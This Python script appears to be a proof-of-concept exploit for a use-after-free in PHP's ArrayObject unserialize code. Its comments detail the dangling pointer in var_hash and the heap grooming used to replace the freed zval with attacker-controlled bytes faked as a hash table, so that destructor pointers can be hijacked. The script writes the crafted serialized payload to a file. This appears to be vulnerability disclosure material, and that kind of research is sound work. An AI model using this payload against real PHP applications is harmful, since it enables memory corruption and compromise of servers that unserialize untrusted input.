#!/usr/bin/env python

import sys

DEFAULT_OUTPUT = "poc.sz"

"""Bug details:

The SPL_METHOD(Array, unserialize) in spl_array.c contains a flaw which allows a
user to access a dangling pointer.

The root of the issues is the following code:

1771         ALLOC_INIT_ZVAL(pflags);
1772         if (!php_var_unserialize(&pflags, &p, s + buf_len, &var_hash TSRMLS_CC) || Z_TYPE_P(pflags) != IS_LONG) {
1773                 zval_ptr_dtor(&pflags);
1774                 goto outexcept;
1775         }
1776
1777         --p; /* for ';' */
1778         flags = Z_LVAL_P(pflags);
1779         zval_ptr_dtor(&pflags);

During unserialization PHP allows the use of a 'r' field to indicate that the
item being unserialized is a reference to some item that has already beeen
unserialized. This functionality is provided by means of the var_hash parameter,
which as items are unserialized maintains a list of their associated zvals. If a
later item wishes to reference a previous item it may do so by using the index
of the previous item in var_hash.

In the above code, during the normal operation of php_var_unserialize pflags
(which is a zval*) will be added to var_hash so that a later item can reference
it if necessary. The flaw is that soon after the successful execution of
php_var_unserialize the zval is destroyed via zval_ptr_dtor. At this point
var_hash contains a dangling pointer, which is accessible in any future calls to
php_var_unserialize which use the same var_hash and attempt to deserialize a
reference. As luck would have it, we can do exactly that soon after:

1790         if (*p!='m') {
1791                 if (*p!='a' && *p!='O' && *p!='C' && *p!='r') {
1792                         goto outexcept;
1793                 }
1794                 intern->ar_flags &= ~SPL_ARRAY_CLONE_MASK;
1795                 intern->ar_flags |= flags & SPL_ARRAY_CLONE_MASK;
1796                 zval_ptr_dtor(&intern->array);
1797                 ALLOC_INIT_ZVAL(intern->array);
1798                 if (!php_var_unserialize(&intern->array, &p, s + buf_len, &var_hash TSRMLS_CC)) {
1799                         goto outexcept;
1800                 }
1801         }

Assuming our input is formatted appropriately we can trigger another call to
php_var_unserialize using the same var_hash. The input shown above will trigger
this call with the string to be unserialized equal to "r:3;;m:a:0:{};".

When a 'r' field is encountered, php_var_unserialize retrieves the specified
zval* from var_hash (in the above case the zval* at index 3 is the dangling
pointer that was used for pflags), and writes it to the first argument provided
to php_var_unserialize (which has type zval**). The outcome is that
intern->array points to a chunk that has already been returned to the heap.

At this stage the interpreter is already in a corrupted state, but to
demonstrate the point our input is crafted such that it then causes the
interpreter to reallocate the chunk and initialize its contents using attacker
provided data. The construction of this data is described below, but in short:
we craft a string which, when unserialized, will trigger an allocation of the
chunk pointed to by intern->array. The unserialized string is then written into
this chunk, allowing us to fake the zval structure as we wish. In our case we
craft it so that it looks like a hash-table (as intern->array normally would
be), but with the internal fields of the hash-table under our control.
Hash-tables contain a number of sensitive fields, such as pointers to functions
that will be called on destruction.
"""

if len(sys.argv) == 2:
    output_name = sys.argv[1]
else:
    output_name = DEFAULT_OUTPUT

print "Writing POC to %s ..." % output_name

"""
typedef union _zvalue_value {
        long lval;                                      /* long value */
        double dval;                            /* double value */
        struct {
                char *val;
                int len;
        } str;
        HashTable *ht;                          /* hash table value */
        zend_object_value obj;
        zend_ast *ast;
} zvalue_value;

struct _zval_struct {
        /* Variable information */
        zvalue_value value;             /* value */
        zend_uint refcount__gc;
        zend_uchar type;        /* active type */
        zend_uchar is_ref__gc;
};

typedef struct _zval_gc_info {
        zval z;
        union {
                gc_root_buffer       *buffered;
                struct _zval_gc_info *next;
        } u;
} zval_gc_info;
"""

"""By the time the unserialize function for ArrayObject returns back to the
point where the next element will be unserialized (in process_nested_data), the
chunk for which we have the dangling pointer will be 4th in the cache for its
size. Each iteration around the loop in process_nested_data pumps one element
from the cache (it allocates two zvals, but frees one). Our goal is to have
php_var_unserialize called on our string content with the target chunk at the
head of the cache. If this is the case then unserialize_str will allocate it and
write the contents of our provided string to it.
"""

FMT_STR = ('a:3:{'
    'i:0;C:11:"ArrayObject":20:{x:i:0;r:3;;m:a:0:{};}'  # Target chunk @ pos 4
    'i:1;'                                              # Target chunk @ pos 3
    'd:11;'                                             # Target chunk @ pos 2
                                                        # Target chunk @ pos 3
    'i:2;'                                              # Target chunk @ pos 2
    'S:%d:'                                             # Target chunk @ pos 1
    '"%s";'                                             # Target chunk allocated
    '}')

str_content = "".join([
        "A"*8,                          # _zval_struct.value.ht         - 8
        "B"*4,                          # padding                       - 12
        "C"*4,                          # padding                       - 16
        "\\01\\00\\00\\00",             # _zval_struct.refcount__gc     - 20
        "\\04",                         # _zval_struct.type (IS_ARRAY)  - 21
        "\\00",                         # _zval_struct.is_ref__gc       - 22
        "\\00"*8,                       # zval_gc_info.u.buffered       - 30
        "\\00",                         # padding                       - 31
])
str_len = 31

"""Important details in the above:

* The string we've created will be passed through the unserialize_str function
which will process the \XX sequences into a single byte value. _emalloc will be
called on the result, to allocate a buffer of size equal to the post-processed
length + 1.

* In order to reallocate the zval that intern->array points to, the string must
have a length equal to a value that will ensure it uses the same heap bucket as
used for zval allocations. On 64-bit zvals are 32 bits in size, with a "true
size" of 48, as given by the allocator. See _zend_mm_alloc_int for details on
which bucket to use is decided. Here we've simply constructed the string to have
the exact same length as sizeof(_zval_struct).

* The _zval_struct.type is set to indicate the crafted memory represents a
hash-table zval (0x4).

* _zval_struct.refcount__gc is set to 0x1 so that when intern->array is
deallocated the zval will be destroyed, thus triggering the hash-table
destruction functionality which contains a variety of hijackable operations. As
can be seen in the zvalue_value union, ht pointer occupies the first
pointer-sized location and thus will be replaced by 8 "A" characters.

* The i_zval_ptr_dtor function will cast the crafted memory to a zval_gc_info
struct and if zval_gc_info.u.buffered is not NULL then
gc_remove_zval_from_buffer will be called with our crafted memory as an
argument. While this does offer up the ability to eventually hit a unlink-style
primitive in gc_remove_from_buffer it's a bit of a pain to make use of, thus we
set that field to NULL.
"""

with open(output_name, 'w') as fd:
    fd.write(FMT_STR % (str_len, str_content))

print "Done"
